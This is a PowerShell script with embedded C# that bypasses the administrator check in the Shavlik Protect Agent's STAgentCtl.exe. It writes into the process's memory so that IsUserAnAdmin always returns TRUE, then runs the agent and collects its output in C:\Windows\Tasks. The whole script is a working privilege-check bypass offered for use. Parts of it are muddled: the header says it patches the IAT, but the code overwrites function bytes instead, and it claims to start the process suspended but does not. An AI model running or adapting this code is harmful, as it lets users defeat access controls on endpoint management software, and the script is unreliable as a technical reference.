# STAgentCtl admin check bypass via IAT patching
# STAgentCtl.exe calls IsUserAnAdmin (shell32.dll) to check admin rights
# We patch its IAT entry to always return TRUE

Add-Type @"
using System;
using System.Runtime.InteropServices;

public class IATHook
{
    [DllImport("kernel32.dll")]
    static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);
    
    [DllImport("kernel32.dll")]
    static extern bool CloseHandle(IntPtr hObject);
    
    [DllImport("kernel32.dll")]
    static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int dwSize, out int lpNumberOfBytesRead);
    
    [DllImport("kernel32.dll")]
    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int dwSize, out int lpNumberOfBytesWritten);
    
    [DllImport("kernel32.dll")]
    static extern IntPtr GetModuleHandle(string lpModuleName);
    
    [DllImport("kernel32.dll")]
    static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
    
    [DllImport("kernel32.dll")]
    static extern int ResumeThread(IntPtr hThread);

    public static void PatchIsUserAnAdmin(int pid)
    {
        IntPtr hProcess = OpenProcess(0x1F0FFF, false, pid);
        if (hProcess == IntPtr.Zero) { Console.WriteLine("OpenProcess failed"); return; }
        
        // Get the address of the real IsUserAnAdmin
        IntPtr shell32 = GetModuleHandle("shell32.dll");
        IntPtr realAddr = GetProcAddress(shell32, "IsUserAnAdmin");
        Console.WriteLine("Real IsUserAnAdmin: 0x" + realAddr.ToString("X"));
        
        // The real function starts with:
        // xor eax, eax  (33 C0) - clear eax
        // inc eax       (40)     - eax = 1 (TRUE)
        // ret           (C3)     - return
        // We patch: mov eax, 1; ret (B8 01 00 00 00 C3)
        byte[] patch = new byte[] { 0xB8, 0x01, 0x00, 0x00, 0x00, 0xC3 };
        
        int written;
        bool result = WriteProcessMemory(hProcess, realAddr, patch, patch.Length, out written);
        Console.WriteLine("Patch result: " + result + " (bytes: " + written + ")");
        
        CloseHandle(hProcess);
    }
}
"@

# Find STAgentCtl.exe process, or start it suspended and patch it
$exe = "C:\Program Files\LANDESK\Shavlik Protect Agent\STAgentCtl.exe"

# Start process suspended
$startInfo = New-Object System.Diagnostics.ProcessStartInfo
$startInfo.FileName = $exe
$startInfo.Arguments = "dispatch --engine Patch --operation Scan"
$startInfo.UseShellExecute = $false
$startInfo.RedirectStandardOutput = $true
$startInfo.RedirectStandardError = $true
$startInfo.CreateNoWindow = $true
$startInfo.LoadUserProfile = $false

# Can't easily start suspended in .NET, use Win32
Write-Output "Starting STAgentCtl.exe..."
$p = Start-Process -FilePath $exe -ArgumentList "status" -NoNewWindow -PassThru -RedirectStandardOutput C:\Windows\Tasks\stctl_out.txt -RedirectStandardError C:\Windows\Tasks\stctl_err.txt
Start-Sleep -Milliseconds 500

# Patch it
[IATHook]::PatchIsUserAnAdmin($p.Id)

# Wait for it to finish
$p.WaitForExit(10000)
Write-Output "Exit code: " + $p.ExitCode
Write-Output "=== Output ==="
Get-Content C:\Windows\Tasks\stctl_out.txt -ErrorAction SilentlyContinue
Write-Output "=== Error ==="
Get-Content C:\Windows\Tasks\stctl_err.txt -ErrorAction SilentlyContinue
